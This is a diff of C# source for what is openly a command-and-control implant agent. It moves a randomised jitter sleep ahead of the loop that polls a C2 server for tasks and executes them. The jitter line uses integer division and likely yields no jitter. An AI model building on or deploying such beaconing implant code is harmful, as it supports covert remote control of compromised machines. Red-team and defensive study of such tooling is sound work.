@@ -82,6 +82,10 @@ while (true)
                 Environment.Exit(1);
             }
 
+            int realJitter = delay * (jitter / 100);
+            if (rnd.Next(2) == 0) { realJitter = -realJitter; }
+            Thread.Sleep((delay + realJitter) * 1000);
+
             var taskRequest = new C2Request { Reason = C2RequestReason.Task, AgentId = baseCommunicationService.BaseConfig.AgentId, AgentStatus = AgentStatus.Active };
             var result = await baseCommunicationService.SimplePostAsync($"/", JsonSerializer.Serialize(taskRequest));
 
@@ -92,6 +96,7 @@ while (true)
                 //var decryptedResult = xorDecryptionBase64DecodingDecorator.Transform(taskResponse.Message);
                 var tasks = JsonSerializer.Deserialize<List<AgentTask>>(taskResponse.Message);
                 if (tasks is null || tasks.Count == 0) continue;
+
 
                 foreach (var task in tasks)
                 {
@@ -196,10 +201,6 @@ while (true)
             {
                 Console.WriteLine($"[{DateTime.UtcNow}]:\tDid not connect to server");
             }
-
-            int realJitter = delay * (jitter / 100);
-            if (rnd.Next(2) == 0) { realJitter = -realJitter; }
-            Thread.Sleep((delay + realJitter) * 1000);
         }
     }
     catch (Exception ex)
